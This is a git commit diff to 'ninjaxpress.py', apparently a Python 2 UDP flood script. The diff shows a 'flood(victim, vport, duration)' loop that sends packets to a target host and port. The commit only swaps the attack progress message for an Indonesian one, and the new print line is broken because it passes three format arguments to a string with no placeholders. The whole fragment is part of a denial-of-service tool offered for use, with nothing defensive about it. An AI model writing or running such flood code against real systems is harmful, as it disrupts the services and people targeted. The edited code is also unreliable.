fabd469f63b77030b6349291d382e6691a2140f0
XflowX234 <84327515+XflowX234@users.noreply.github.com>
2021-05-22 09:03:54 +0700

    Update ninjaxpress.py

--- ninjaxpress.py
+++ ninjaxpress.py
@@ -23,7 +23,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+        print "Paket Sedang OTW "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
